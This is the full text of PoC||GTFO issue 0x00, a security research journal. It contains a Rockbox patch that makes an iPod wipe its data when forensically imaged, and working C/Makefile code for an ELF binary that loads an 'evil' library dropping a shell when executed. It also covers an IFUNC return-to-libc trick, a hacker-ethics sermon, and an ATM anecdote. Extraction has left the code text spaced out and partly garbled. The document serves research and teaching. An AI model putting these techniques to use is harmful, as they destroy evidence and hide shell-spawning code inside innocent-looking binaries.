International Journal of PoC k GTFO
Issue 0x00, a CFP with PoC
An epistle from the desk of Rt. Revd. Pastor Manul Laphroaig
pastor@phrack.org
August 5, 2013
Legal Note: Permission to use all or part of this work for personal, classroom, or whatever other use is NOT
granted unless you make a copy and pass it to a neighbor without fee, excepting libations offered by the aforementioned
neighbor in order to facilitate neighborly hacking, and that said copy bears this notice and the full citation on the first
page. Because if burning a book is a sin—which it surely is!—then copying of a book is your sacred duty. For uses in
outer space where a neighbor to share with cannot be readily found, seek blessing from the Pastor and kindly provide
your orbital ephemerides and radio band so that updates could be beamed to you via the Southern Appalachian
Space Agency (SASA).
1
Call to Worship
Neighbors, please join me in reading this first issue of the International Journal of Proof of Concept or Get
the Fuck Out, a friendly little journal for ladies and gentlemen of distinguished ability and taste in the field
of computer security and the architecture of weird machines.
In Section 2, Travis Goodspeed will show you how to build your own antiforensics hard disk out of an
iPod by simple patching of the open source Rockbox firmware. The result is a USB disk, which still plays
music, but which will also self destruct if forensically imaged.
In Section 3, Julian Bangert and Sergey Bratus provide some nifty tricks for abusing the differences in
ELF dialect between exec() and ld.so. As an example, they produce a file that is both a library and an
executable, to the great confusion of reverse engineers and their totally legitimate IDA Pro licenses.
Section 4 is a sermon on the subjects of Bitcoin, Phrack, and the den on iniquity known as the RSA
Conference, inviting all of you to kill some trees in order to save some source. It brings the joyful news that
we should all shut the fuck up about hat colors and get back to hacking!
Delivering even more nifty ELF research, Bx presents in Section 5 a trick for returning from the ELF
loader into a libc function by abuse of the IFUNC symbol. There’s a catch, though, which is that on amd64
her routine seems to pass a very restricted set of arguments. The first parameter must be zero, the second
must be the address of the function being called, and the third argument must be the address of the symbol
being dereferenced. Readers who can extend this into an arbitrary return to libc are urged to do it and share
the trick with others!
Remembering good times, Section 6 by FX tells us of an adventure with Barnaby Jack, one which features
a golden vending machine and some healthy advice to get the fuck out of Abu Dhabi.
Finally, in Section 7, we pass the collection plate and beg that you contribute some PoC of your own.
Articles should be short and sweet, written such that a clever reader will be inspired to build something
nifty.
12
iPod Antiforensics
by Travis Goodspeed
In my lecture introducing Active Disk Antiforensics at 29C3, I presented tricks for emulating a disk with
self defense features using the Facedancer board. This brief article will show you how to build your own
antiforensics disk out of an iPod by patching the Rockbox framework.
To quickly summarize that lecture: (1) USB Mass Storage is just a wrapper for SCSI. We can implement
these protocols and make our own disks. (2) A legitimate host will follow the filesystem and partition data
structure, while a malicious host—that is to say, a forensics investigator’s workstation—will read the disk
image from beginning to end. There are other ways to distinguish hosts, but this one is the easiest and has
fewest false positives. (3) By overwriting its contents as it is being imaged, a disk can destroy whatever
evidence or information the forensics investigator wishes to obtain.
There are, of course, exceptions to the above rules. Some high-end imaging software will image a disk
backward from the last sector toward the first. A law-enforcement forensics lab will never mount a volume
before imaging it, but an amateur or a lab less concerned with a clean prosecution might just copy the
protected files out of the volume.
Finally, there is the risk that an antiforensics disk might be identified as such by a forensics investigator.
The disk’s security relies upon the forensics technician triggering the erasure, and it won’t be sufficient if the
technician knows to work around the defenses. For example, he could revert to the recovery ROM or read
the disk directly.
2.1
Patching Rockbox
Rockbox exposes its hard disk to the host through USB Mass Storage, where handler functions implement
each of the different SCSI commands needed for that protocol. To add antiforensics, it is necessary only to
hook two of those functions: READ(10) and WRITE(10).
In firmware/usbstack/usb storage.c of the Rockbox source code, blocks are read in two places. The
first of these is in handle scsi(), near the SCSI READ 10 case. At the end of this case, you should see a call
to send and read next(), which is the second function that must be patched.
In both of these, it is necessary to add code to both (1) observe incoming requests for illegal traffic and
(2) overwrite sectors as they are requested after the disk has detected tampering. Because of code duplication,
you will find that some data leaks out through send and read next() if you only patch handle scsi(). (If these
function names mean nothing to you, then you do not have the Rockbox code open, and you won’t get much
out of this article, now will you? Open the damn code!)
On an iPod, there will never be any legitimate reads over USB to the firmware partition. For our PoC,
let’s trigger self-destruction when that region is read. As this is just a PoC, this patch will provide nonsense
replies to reads instead of destroying the data. Also, the hardcoded values might be specific to the 2048-byte
sector devices, such as the more recent iPod Video hardware.
The following code should be placed in the SCSI READ 10 case of handle scsi(). tamperdetected
is a static bool that ought to be declared earlier in usb storage.c. The same code should go into the
send and read next() function.
//These sectors are for 2048-byte sectors.
//Multiply by 4 for devices with 512-byte sectors.
if(cur_cmd.sector>=10000 && cur_cmd.sector<48000)
tamperdetected=true;
//This is the legitimate read.
cur_cmd.last_result = storage_read_sectors(
IF_MD2(cur_cmd.lun,) cur_cmd.sector,
MIN(READ_BUFFER_SIZE/SECTOR_SIZE, cur_cmd.count),
2cur_cmd.data[cur_cmd.data_select]
);
//Here, we wipe the buffer to demo antiforensics.
if(tamperdetected){
for(i=0;i<READ_BUFFER_SIZE;i++)
cur_cmd.data[cur_cmd.data_select][i]=0xFF;
//Clobber the buffer for testing.
strcpy(cur_cmd.data[cur_cmd.data_select],
"Never gonna let you down.");
//Comment the following to make a harmless demo.
//This writes the buffer back to the disk,
//eliminating any of the old contents.
if(cur_cmd.sector>=48195)
storage_write_sectors(
IF_MD2(cur_cmd.lun,)
cur_cmd.sector,
MIN(WRITE_BUFFER_SIZE/SECTOR_SIZE, cur_cmd.count),
cur_cmd.data[cur_cmd.data_select]);
}
2.2
Shut up and play the single!
Neighbors who are too damned lazy to read this article and implement their own patches can grab my
Rockbox patches from https://github.com/travisgoodspeed/.
2.3
Bypassing Antiforensics
This sort of an antiforensics disk can be most easily bypassed by placing the iPod into Disk Mode, which
can be done by a series of key presses. For example, the iPod Video is placed into Disk Mode by holding the
Select and Menu buttons to reboot, then holding Select and Play/Pause to enter Disk Mode. Be sure that
the device is at least partially charged, or it will continue to reboot. Another, surer method, is to remove
the disk from the iPod and read it manually.
Further, this PoC does not erase evidence of its own existence. A full and proper implementation ought
to replace the firmware partition at the beginning of the disk with a clean Rockbox build of the same revision
and also expand later partitions to fill the disk.
2.4
Neighborly Greetings
Kind thanks are due to The Grugq and Int80 for their work on traditional antiforensics of filesystems and
file formats. Thanks are also due to Scott Moulton for discretely correcting a few of my false assumptions
about real-world forensics.
Thanks are also due to my coauthors on an as-yet-unpublished paper which predates all of my active
antiforensics work but is being held up by the usual academic nonsense.
33
ELFs are dorky, Elves are cool
by Sergey Bratus and Julian Bangert
ELF ABI is beautiful. It’s one format to rule all the tools: when a compiler writes a love letter to the
linker about its precious objects, it uses ELF; when the RTLD performs runtime relocation surgery, it goes
by ELF; when the kernel writes an epitaph for an uppity process, it uses ELF. Think of a possible world
where binutils would use their own separate formats, all alike, leaving you to navigate the maze; or think of
how ugly a binary format that’s all things to all tools could turn out to be (∗cough∗ ASN.1, X.509 ∗cough∗),
and how hard it’d be to support, say, ASLR on top of it. Yet ELF is beautiful.
Verily, when two parsers see two different structures in the same bunch of bytes, trouble ensues. A
difference in parsing of X.509 certificates nearly broke the internets’ SSL trust model 1 . The latest Android
“Master Key” bugs that compromised APK signature verification are due to different interpretation of archive
metadata by Java and C++ parsers/unzippers 2 – yet another security model-breaking parser differential.
Similar issues with parsing other common formats and protocols may yet destroy remaining trust in the open
Internet – but see http://langsec.org/ for how we could start about fixing them.
ELF is beautiful, but with great beauty there comes great responsibility – for its parsers. 3 So do all the
different binutils components as well as the Linux kernel see the same contents in an ELF file? This PoC
shows that’s not the case.
There are two major parsers that handle ELF data. One of them is in the Linux kernel’s implementation
of execve(2) that creates a new process virtual address space from an ELF file. The other – since the majority
of executables are dynamically linked – is the RTLD (ld.so(8), which on your system may be called something
like /lib64/ld-linux-x86-64.so.2 4 , which loads and links your shared libraries – into the same address space.
It would seem that the kernel’s and the RTLD’s views of this address space must be the same, that is,
their respective parsers should agree on just what spans of bytes are loaded at which addresses. As luck and
Linux would have it, they do not.
The RTLD is essentially a complex name service for the process namespace that needs a whole lot of
configuration in the ELF file, as complex a tree of C structs as any. By contrast, the kernel side just looks
for a flat table of offsets and lengths of the file’s byte segments to load into non-overlapping address ranges.
RTLD’s configuration is held by the .dynamic section, which serves as a directory of all the relevant symbol
tables, their related string tables, relocation entries for the symbols, and so on. 5 The kernel merely looks
past the ELF header for the flat table of loadable segments and proceeds to load these into memory.
As a result of this double vision, the kernel’s view and the RTLD’s view of what belongs in the process
address space can be made starkly different. A libpoc.so would look like a perfectly sane library to RTLD,
calling an innocent “Hello world” function from an innocent libgood.so library. However, when run as an
executable it would expose a different .dynamic table, link in a different library libevil.so, and call a very
different function (in our PoC, dropping shell). It should be noted that ld.so is also an executable and can be
used to launch actual executables lacking executable permissions, a known trick from the Unix antiquity; 6
however, its construction is different.
The core of this PoC, makepoc.c that crafts the dual-use ELF binary, is a rather nasty C program. It is,
in fact, a “backport-to-C” of our Ruby ELF manipulation tool Mithril 7 , inspired by ERESI 8 , but intended
for liberally rewriting binaries rather than for ERESI’s subtle surgery on the live process space.
1 See “PKI Layer Cake” http://ioactive.com/pdfs/PKILayerCake.pdf by Dan Kaminsky, Len Sassaman, and Meredith L.
Patterson
2 See, e.g., http://www.saurik.com/id/18 and http://www.saurik.com/id/17.
3 Cf. “The Format and the Parser”, a little-known variant of the “The Beauty and the Beast”. They resolved their parser
differentials and lived vulnlessly ever after.
4 Just objcopy -O binary -j .interp /bin/ls /dev/stdout, wasn’t that easy? :)
5 To achieve RTLD enlightenment, meditate on the grugq’s http://grugq.github.io/docs/subversiveld.pdf and mayhem’s
http://s.eresi-project.org/inc/articles/elf-rtld.txt, for surely these are the incarnations of the ABI Buddhas of our
age, and none has described the runtime dynamic linking internals better since.
6 /lib/ld-linux.so <wouldbe-execfile>
7 https://github.com/jbangert/mithril
8 http://www.eresi-project.org/
4/∗ −−−−−−−−−−−−−−−−−−−− makepoc . c −−−−−−−−−−−−−−−−−−−−−−−∗/
/∗
I met a p r o f e s s o r o f arcane d e g r e e
Who s a i d : Two v a s t and h a n d w r i t t e n p a r s e r s
L i v e i n t h e w i l d . Near them , i n t h e dark
H a l f sunk , a s h a t t e r i n g e x p l o i t l i e s , whose frown ,
And w r i n k l e d l i p , and s n e e r o f c o l d command ,
T e l l t h a t i t s s c u l p t o r w e l l t h o s e p a p e r s read
Which y e t s u r v i v e , stamped on t h e s e l i f e l e s s t h i n g s ,
The hand t h a t mocked them and t h e s t u d e n t t h a t f e d :
And on t h e t e r m i n a l t h e s e words appear :
”My name i s Turing , w r e c k e r o f p r o o f s :
Parse t h i s unambigously , ye machine , and d e s p a i r ! ”
Nothing b e s i d e s i s p o s s i b l e . Round t h e decay
Of t h a t c o l o s s a l wreck , b o u n d l e s s and b a r e
The l o n e and l e v e l r o o t s h e l l s f o r k away .
−− I n s p i r e d by Edward S h e l l e y
∗/
#include < e l f . h>
#include <s t d i o . h>
#include < s t d l i b . h>
#include <s t r i n g . h>
#include <a s s e r t . h>
#define PAGESIZE 4096
size t filesz ;
char f i l e [ 3 ∗PAGESIZE ] ; // This i s t h e enormous b u f f e r h o l d i n g t h e ELF f i l e .
// For n e i g h b o u r s running t h i s on an E l e c t r o n i c a BK,
// t h e s i z e might have t o be r e d u c e d .
E l f 6 4 P h d r ∗ f i n d d y n a m i c ( E l f 6 4 P h d r ∗ phdr ) ; u i n t 6 4 t f i n d d y n s t r ( E l f 6 4 P h d r ∗ phdr ) ;
/∗ New memory l a y o u t
Memory
mapped t o
File Offsets
0 k ++++|
|
| ELF Header
| −−−|
+
| F i r s t | ∗ ∗ ∗ ∗ ∗ | ( o r i g . code )
|
| | LD. so / k e r n e l boundary assumes
+
| Page |
| ( r e a l . dynamic ) | <−|−+ t h e o f f s e t t h a t a p p l i e s on d i s k
4k +
+======+
+================+
| | works a l s o i n memory ; however ,
+
|
|
|
|
i f phdrs are in a d i f f e r e n t
++ > | Second | ∗
| kernel phdr
|<−−|−− segment , t h i s won ’ t h o l d .
| Page | ∗
|
|
|
| ∗
|
|
+======+
∗ +================+
∗ | ldso phdrs
|−−−|
| f a k e . dynamic | <−|
| w/ new d y n s t r |
==================
Somewhere f a r below , t h e r e i s t h e . d a t a segment ( which we i g n o r e )
∗/
int e l f m a g i c ( ) {
E l f 6 4 E h d r ∗ ehdr = f i l e ;
E l f 6 4 P h d r ∗ o r i g p h d r s = f i l e + ehdr−>e p h o f f ;
E l f 6 4 P h d r ∗ f i r s t l o a d , ∗ phdr ;
int i =0;
5// For t h e s a k e o f b r e v i t y , we assume a l o t a b o u t t h e l a y o u t o f t h e program :
a s s e r t ( f i l e s z >PAGESIZE ) ;
// F i r s t 4K has t h e mapped p a r t s o f program
a s s e r t ( f i l e s z <2∗PAGESIZE ) ; // 2nd 4K h o l d s t h e program h e a d e r s f o r t h e k e r n e l
// 3 rd 4 k h o l d s t h e program h e a d e r s f o r l d . so +
// t h e new dynamic s e c t i o n and i s mapped j u s t a b ov e t h e program
f o r ( f i r s t l o a d = o r i g p h d r s ; f i r s t l o a d −>p t y p e !=PT LOAD ; f i r s t l o a d ++);
a s s e r t ( 0 == f i r s t l o a d −>p o f f s e t ) ;
a s s e r t (PAGESIZE > f i r s t l o a d −>p memsz ) ; // 2nd page o f memory w i l l h o l d 2nd segment
u i n t 6 4 t b a s e a d d r = ( f i r s t l o a d −>p vaddr &  ̃0 x f f f u l ) ;
//PHDRS as read by t h e k e r n e l ’ s e x e c v e ( ) or d l o p e n ( ) , b u t NOT s e e n by l d . so
Elf64 Phdr ∗ kernel phdrs = f i l e + f i l e s z ;
memcpy ( k e r n e l p h d r s , o r i g p h d r s , ehdr−>e phnum ∗ s i z e o f ( E l f 6 4 P h d r ) ) ; // copy PHDRs
ehdr−>e p h o f f = ( char ∗ ) k e r n e l p h d r s − f i l e ; // P o i n t ELF h e a d e r t o new PHDRs
ehdr−>e phnum++;
//Add a new segment (PT LOAD) , s e e a bo v e diagram
E l f 6 4 P h d r ∗ new load = k e r n e l p h d r s + ehdr−>e phnum − 1 ;
new load−>p t y p e = PT LOAD ;
new load−>p vaddr = b a s e a d d r + PAGESIZE ;
new load−>p paddr = new load−>p vaddr ;
new load−>p o f f s e t = 2∗PAGESIZE ;
new load−> p f i l e s z = PAGESIZE ;
new load−>p memsz = new load−> p f i l e s z ;
new load−>p f l a g s = PF R | PF W;
// D i s a b l e l a r g e p a g e s or l d . so c o m p l a i n s when l o a d i n g as a . so
f o r ( i =0; i <ehdr−>e phnum ; i ++){
i f ( k e r n e l p h d r s [ i ] . p t y p e == PT LOAD)
k e r n e l p h d r s [ i ] . p a l i g n = PAGESIZE ;
}
// S et u p t h e PHDR t a b l e t o be s e e n by l d . so , not k e r n e l ’ s e x e c v e ( )
E l f 6 4 P h d r ∗ l d s o p h d r s = f i l e + ehdr−>e p h o f f
− PAGESIZE
// F i r s t 4K o f program a d d r e s s s p a c e i s mapped i n o l d segment
+ 2∗PAGESIZE ; // O f f s e t o f new segment
memcpy ( l d s o p h d r s , k e r n e l p h d r s , ehdr−>e phnum ∗ s i z e o f ( E l f 6 4 P h d r ) ) ;
// l d . so 2 . 1 7 d e t e r m i n e s l o a d b i a s (ASLR) o f main b i n a r y by l o o k i n g a t PT PHDR
f o r ( phdr=l d s o p h d r s ; phdr−>p t y p e != PT PHDR; phdr ++);
phdr−>p paddr = b a s e a d d r + ehdr−>e p h o f f ; // l d . so e x p e c t s PHDRS a t t h i s vaddr
// This i s n ’ t used t o f i n d t h e PHDR t a b l e , b u t by l d . so t o compute ASLR s l i d e
// ( main map−>l a d d r ) as ( a c t u a l PHDR a d d r e s s )−(PHDR a d d r e s s i n PHDR t a b l e )
phdr−>p vaddr = phdr−>p paddr ;
//Make a new . dynamic t a b l e a t t h e end o f t h e second segment ,
// t o l o a d l i b e v i l i n s t e a d o f l i b g o o d
unsigned dynsz = f i n d d y n a m i c ( o r i g p h d r s )−>p memsz ;
Elf64 Dyn ∗ o l d d y n = f i l e + f i n d d y n a m i c ( o r i g p h d r s )−> p o f f s e t ;
Elf64 Dyn ∗ l d s o d y n = ( char ∗ ) l d s o p h d r s + ehdr−>e phnum ∗ s i z e o f ( E l f 6 4 P h d r ) ;
memcpy ( l d s o d y n , old dyn , dynsz ) ;
// Modify a d d r e s s o f dynamic t a b l e i n l d s o p h d r s ( which i s o n l y used i n e x e c ( ) )
f i n d d y n a m i c ( l d s o p h d r s )−>p vaddr = b a s e a d d r + ( char ∗ ) l d s o d y n −
6f i l e − PAGESIZE ;
//We need a new d y n s t r e n t r y . L u c k i l y l d . so doesn ’ t do range c h e c k s on s t r t a b
// o f f s e t s , so we j u s t s t i c k i t a t t h e end o f t h e f i l e
char ∗ l d s o n e e d e d s t r = ( char ∗ ) l d s o d y n +
ehdr−>e phnum ∗ s i z e o f ( E l f 6 4 P h d r ) + dynsz ;
strcpy ( l d s o n e e d e d s t r , ” l i b e v i l . so ” ) ;
a s s e r t ( l d s o d y n −>d t a g == DT NEEDED ) ; // r e p l a c e 1 s t dynamic e n t r y , DT NEEDED
l d s o d y n −>d un . d p t r = b a s e a d d r + l d s o n e e d e d s t r − f i l e −
PAGESIZE − f i n d d y n s t r ( o r i g p h d r s ) ;
}
void r e a d f i l e ( ) {
FILE ∗ f= f o p e n ( ” t a r g e t . handchecked ” , ” r ” ) ;
// p r o v i d e d b i n a r y b e c a u s e t h e PoC might not l i k e t h e o u t p u t o f your c o m p i l e r
assert ( f );
f i l e s z = f r e a d ( f i l e , 1 , s i z e o f f i l e , f ) ; // Read t h e e n t i r e f i l e
fclose ( f );
}
void w r i t e f i l e ( ) {
FILE ∗ f= f o p e n ( ” l i b p o c . s o ” , ”w” ) ;
fwrite ( f i l e , sizeof f i l e ,1 , f ) ;
fclose ( f );
system ( ”chmod +x l i b p o c . s o ” ) ;
}
E l f 6 4 P h d r ∗ f i n d d y n a m i c ( E l f 6 4 P h d r ∗ phdr ) {
// Find t h e PT DYNAMIC program h e a d e r
f o r ( ; phdr−>p t y p e != PT DYNAMIC; phdr ++);
return phdr ;
}
u i n t 6 4 t f i n d d y n s t r ( E l f 6 4 P h d r ∗ phdr ) {
// Find t h e a d d r e s s o f t h e dynamic s t r i n g t a b l e
phdr = f i n d d y n a m i c ( phdr ) ;
Elf64 Dyn ∗dyn ;
f o r ( dyn = f i l e + phdr−>p o f f s e t ; dyn−>d t a g != DT STRTAB; dyn++);
return dyn−>d un . d p t r ;
}
int main ( )
{
readfile ();
elf magic ();
writefile ();
}
# −−−−−−−−−−−−−−−−−−−− M a k e f i l e −−−−−−−−−−−−−−−−−−−−−−−
%. s o : %. c
g c c − f p i c −s h a r e d −Wl,−soname , $@ −o $@ $ ˆ
a l l : l i b g o o d . s o l i b e v i l . s o makepoc t a r g e t l i b p o c . s o a l l i s w e l l
l i b p o c . s o : t a r g e t . handchecked makepoc
. / makepoc
clean :
rm −f ∗ . s o ∗ . o t a r g e t makepoc a l l i s w e l l
7t a r g e t : t a r g e t . c libgood . so l i b e v i l . so
echo ”#d e f i n e INTERP \ ” ‘ o b j c o p y −O b i n a r y −j . i n t e r p \
/ b i n / l s / dev / s t d o u t ‘ \ ” ” >> i n t e r p . i n c && g c c −o t a r g e t \
−Os −Wl,− rpath , . −Wl,− e f o o −L . −s h a r e d −fPIC −l g o o d t a r g e t . c \
&& s t r i p −K f o o $@ && echo ’ copy t a r g e t t o t a r g e t . handchecked by hand ! ’
t a r g e t . handchecked : t a r g e t
cp $< $@ ; echo ”Beware , you c o m p i l e d t a r g e t y o u r s e l f . \
YMMV with your c o m p i l e r , t h i s i s j u s t a f r i e n d l y poc ”
a l l i s w e l l : a l l i s w e l l . c l i b p o c . so
g c c −o $@ −Wl,− rpath , . −l p o c −L . $<
makepoc : makepoc . c
g c c −ggdb −o $@ $<
/∗ −−−−−−−−−−−−−−−−−−−− t a r g e t . c −−−−−−−−−−−−−−−−−−−−−−−∗/
#include <s t d i o . h>
#include ” i n t e r p . i n c ”
attribute (( section (” . interp ” ))) =
const char m y i n t e r p [ ]
extern int f u n c ( ) ;
int f o o ( ) {
// p r i n t f (” C a l l i n g f u n c \n ” ) ;
func ( ) ;
e x i t ( 1 ) ; // Needed , b e c a u s e t h e r e i s no c r t . o
}
INTERP ;
/∗ −−−−−−−−−−−−−−−−−−−− l i b g o o d . c −−−−−−−−−−−−−−−−−−−−−−−∗/
#include <s t d i o . h>
int f u n c ( ) { p r i n t f ( ” H e l l o World\n” ) ; }
/∗ −−−−−−−−−−−−−−−−−−−− l i b e v i l . c −−−−−−−−−−−−−−−−−−−−−−−∗/
#include <s t d i o . h>
int f u n c ( ) { system ( ” / b i n / sh ” ) ; }
/∗ −−−−−−−−−−−−−−−−−−−− a l l i s w e l l . c −−−−−−−−−−−−−−−−−−−−−−−∗/
extern int f o o ( ) ;
int main ( int argc , char ∗∗ argv )
{
foo ( ) ;
}
3.1
Neighborly Greetings and \cite{}s:
Our gratitude goes to Silvio Cesare, the grugq, klog, mayhem, and Nergal, whose brilliant articles in Phrack
and elsewhere taught us about the ELF format, runtime, and ABI. Special thanks go to the ERESI team, who
set a high standard of ELF (re)engineering to follow. Skape’s article Uninformed 6:3 led us to re-examine
ELF in the light of weird machines, and we thank .Bx for showing how to build those to full generality.
Last but not least, our view was profoundly shaped by Len Sassaman and Meredith L. Patterson’s amazing
insights on parser differentials and their work with Dan Kaminsky to explore them for X.509 and other
Internet protocols and formats.
84
The Pastor Manul Laphroaig’s First Epistle to Hacker Preachers
of All Hats, in the sincerest hope that we might shut up about
hats, and get back to hacking.
First, I must caution you to cut out the Sun Tsu quotes. While every good speaker indulges in quoting from
good books of fiction or philosophy, verily I warn you that this can lead to unrighteousness! For when we
tell beginners to study ancient philosophy instead of engineering, they will become experts in the Art of War
and not in the Art of Assembly Language! They find themselves reading Wikiquote instead of Phrack, and
we are all the poorer for it!
I beg you: Rather than beginning your sermons with a quote from Sun Tzu, begin them with nifty little
tricks which the laity can investigate later. For example, did you know that ‘strings -n 20 /.bitcoin/blk0001.dat‘
dumps ASCII art portraits of both Saint Sassaman and Ben Bernanke? This art was encoded as fake public
keys used in real transactions, and it can’t be removed without undoing all Bitcoin transactions since it was
inserted into the chain. The entire Bitcoin economy depends upon the face of the chairman of the Fed not
being removed from its ledger! Isn’t that clever?
Speaking of cleverness, show respect for it by citing your scripture in chapter and verse. Phrack 49:14
tells us of Aleph1’s heroic struggle to explain the way the stack really works, and Uninformed 6:2 is the
harrowing tale of Johnny Cache, H D Moore, and Skape exploiting the Windows kernel’s Wifi drivers with
beacon frames and probe responses. These papers are memories to be cherished, and they are stories worth
telling. So tell them! Preach the good word of how the hell things actually work at every opportunity!
Don’t just preach the gospel, give the good word on paper. Print a dozen copies of a nifty paper and
give them away at the next con. Do this at Recon, and you will make fascinating friends who will show you
things you never knew, no matter how well you knew them before. Do this at RSA–without trying to sell
anything–and you’ll be a veritable hero of enlightenment in an expo center of half-assed sales pitches and
booth babes. Kill some trees to save some souls!
Don’t just give papers that others have written. Give early drafts of your own papers, or better still your
own documented 0day. Nothing demonstrates neighborliness like the gift of a good exploit.
Further, I must warn you to ignore this Black Hat / White Hat nonsense. As a Straw Hat, I tell you
that it is not the color of the hat that counts; rather, it is the weave. We know damned well that patching a
million bugs won’t keep the bad guys out, just as we know that the vendor who covers up a bug caused by his
own incompetence is hardly a good guy. We see righteousness in cleverness, and we study exploits because
they are so damnably clever! It is a heroic act to build a debugger or a disassembler, and the knowledge of
how to do so ought to be spread far and wide.
First, consider the White Hats. Black Hats are quick to judge these poor fellows as do-gooders who
kill bugs. They ask, “Who would want to kill such a lovely bug, one which gives us such clever exploits?”
Verily I tell you that death is a necessary part of the ecosystem. Without neighbors squashing old bugs,
what incentive would there be to find more clever bugs or to write more clever exploits? Truly I say to the
Black Hats, you have recouped every dollar you’ve lost on bugfixes by the selective pressure that makes your
exploits valuable enough to sustain a market!
Next, consider the Black Hats. White Hat neighbors are still quicker to judge these poor fellows, not so
much for selling their exploits as for hoarding their knowledge. A neighbor once told me, “Look at these
sinners! They hide their knowledge like a candle beneath a basket, such that none can learn from it.” But
don’t be so quick to judge! While it’s true that the Black Hats publish more slowly, do not mistake this
for not publishing. For does not a candle, when hidden beneath a basket, soon set the basket alight and
burn ten times as bright? And is not self-replicating malware just a self-replicating whitepaper, written in
machine language for the edification of those who read it? Verily I tell you, even the Black Hats have a
neighborliness to them.
So please, shut about hats and get back to the code.
—M. Laphroaig
Postscript: This little light of mine, I’m gonna let it shine!
95
Returning from ELF to Libc
by Rebecca “Bx” Shapiro
Dear friends,
As you may or may not know, demons lurk within ELF metadata. If you have not yet been introduced
to these creatures, please put this paper down and take a look at either our talk given at 29C3 9 , or our
soon-to-be released WOOT publication (in August 2013).
Although the ability to treat the loader as a Turing-complete machine is Pretty Neat, we realize that
there are a lot of useful computation vectors built right into the libraries that are mapped into the loader
and executable’s address space. Instead of re-inventing the wheel, in this POC sermon we’d like to begin
exploring how to harness the power given to us by the perhaps almighty libc.
The System V amd64 ABI scripture 10 in combination with the eglibc-2.17 writings have provided us ELF
demon-tamers with the mighty useful IFUNC symbol. Any symbol of type IFUNC is treated as an indirect
function – the symbol’s value is treated as a function, which takes no arguments, and whose return value is
the patch.
The question we will explore from here on is: Can we harness the power of the IFUNC to invoke a piece
of libc?
After vaguely thinking about this problem for a couple of months, we have finally made progress towards
the answer.
Consider the exit() library call. Although one may question why we would want to craft metadata that
causes a exit() to be invoked, we will do so anyway, because it is one of the simplest calls we can make,
because the single argument it takes is not particularly important, and success is immediately obvious.
To invoke exit(), we must lookup the following information when we are compiling the crafted metadata
into some host executable. This is accomplished in three steps, as we explain in our prior work.
1. The location of exit() in the libc binary.
2. The location of the host executable’s dynamic symbol table.
3. The location of the host executable’s dynamic relocation table.
To invoke exit(), we must accomplish the following during runtime:
1. Lookup the base address of libc.
2. Use this base address to calculate the location of exit() in memory.
3. Store the address of exit() in a dynamic IFUNC symbol.
4. Cause the symbol to be resolved.
. . . and then there was exit()!
Our prior work has demonstrated how to accomplish the first two tasks. Once the first two tasks have
been completed at runtime, we find ourselves with a normal symbol (which we will call symbol 0) whose
value is the location of exit(). At this point we have two ways to proceed: we can
(1) have a second dynamic symbol (named symbol 1) of type IFUNC and have relocation entry of type
R X86 64 64 which refers to symbol 0 and whose offset is set to the location of symbol 1’s values, causing
the location of ext() to be copied into symbol 1,
-or-
(2) update the type of the symbol that already has the address of exit() to that it becomes an IFUNC.
This can be done in a single relocation entry of type R X86 64, whose addend is that which is copied to the
9 https://www.youtube.com/watch?v=dnLYoMIBhpo
10 http://www.uclibc.org/docs/psABI-x86_64.pdf
10first 8 bytes of symbol 0. If we set the addend to 0x0100000a00000000, we will find that the symbol type
will become 0x0a (IFUNC), the symbol shndx will be set as 01 so the IFUNC is treated as defined, and the
other fields in the symbol structure will remain the same.
After our metadata that sets up the IFUNC, we need a relocation entry of type R X86 64 64 that
references our IFUNC symbol, which will cause exit() to be invoked.
At this moment, you may be wondering how it may be possible to do more interesting things such as have
control of the argument passed to the function call. It turns out that this problem is still being researched.
In eglibc-2.17, at the time the IFUNC is called, the first argument is and will always be 0, the second
argument is the address of the function being called, and the third argument the addressed of the symbol
being referenced. Therefore at this level exec(0) is always called. It will clearly take some clever redirection
magic to be able to have control over the function’s arguments purely from ELF metadata.
Perhaps you will see this as an opportunity to go on a quest of ELF-discovery and be able to take this
work to the next level. If you do discover a path to argument control, we hope you will take the time to
share your thoughts with the wider community.
Peace out, and may the Manul always be with you.
116
GTFO or #FAIL
by FX of Phenoelit
To honor the memory of the great Barnaby Jack, we would like to relate the events of a failed POC. It
happened on the second day of the Black Hat Abu Dhabi conference in 2010 that the hosts, impressed by
Barnaby’s presentation on ATMs, 11 pointed out that the Emirates Palace hotel features a gold ATM 12 . So
they asked him to see if he could hack that one too.
Never one to reject challenges or fun to be had, Barns gathered a bunch of fellow hackers, who shall
remain anonymous in this short tale, to accompany him to the gold ATM. Sufficient to say, yours truly was
among them. Thus it happened that a bunch of hackers and a number of hosts in various white and pastel
colored thawbs went to pay the gold ATM a visit. Our hosts had assured everyone in the group that it was
totally OK for us to hack the machine, as long as they were with us.
6.1
The POC
While the gold ATM, being plated with gold itself, looked rather solid 13 , a look at the back of the machine
revealed a messy knot of cables, the type of wiring normally found on a Travis Goodspeed desk. Since the
machine updates the gold pricing information online, we obviously wanted to have a look at the traffic. We
therefore disconnected the flimsy network connections and observed the results, of which there were initially
none to be observed, except for the machine to start beeping in an alarming way.
Nothing being boring, we decided to power cycle the machine and watch it boot. For that, yours truly
got behind it and used his considerable power cable unplugging skills to their fullest extent. Interestingly
enough, the gold ATM stayed operational, obviously being equipped with the only Uninterruptable Power
Source (UPS) in the world that actually provides power when needed.
Reappearing from behind the machine, happily holding the unplugged network and power cables, yours
truly observed the group of hosts being already far away and the group of hackers following close behind.
Inverting their vector of movement, the cause of the same became obvious with the approaching storm
troopers of Blackwater quality and quantity. Therefore, yours truly joined the other hackers at considerable
speed.
6.2
The FAIL
Needless to say, what followed was a tense afternoon of drinking, waiting, and considering exit scenarios from
a certain country, depending on individual citizenships, while powers to be were busy turning the incident
into a non-issue.
The #FAIL was quickly identified as the inability of the fellowship of hackers to determine rank and
therefore authority of people that all wear more or less the same garments. What had happened was that
the people giving authority to hack the machine actually did not possess said authority in the first place or,
alternatively, had pissed off someone with more authority.
The failed POC pointed out the benefits of western military uniforms and their rank insignia quite clearly.
6.3
Neighborly Greetings
Neighborly greetings are in order to Mr. Nils, who, upon learning about the incident, quietly handed the
local phone number of the German embassy to yours truly.
11 https://www.blackhat.com/html/bh-ad-10/bh-ad-10-archives.html\#Jack
12 http://www.nydailynews.com/2.1353/abu-dhabi-emirates-palace-hotel-sports-vending-machine-gold-article-1.
449348
13 http://www.gold-to-go.com/en/company/history/
127
A Call for PoC
by Rt. Revd. Pastor Manul Laphroaig
We stand, sit, or simply relax and chill on the shoulders of the giants, Phrack and Uninformed. They
pushed the state-of-the-art forward mightily with awesome, deep papers and at times even with poetry to
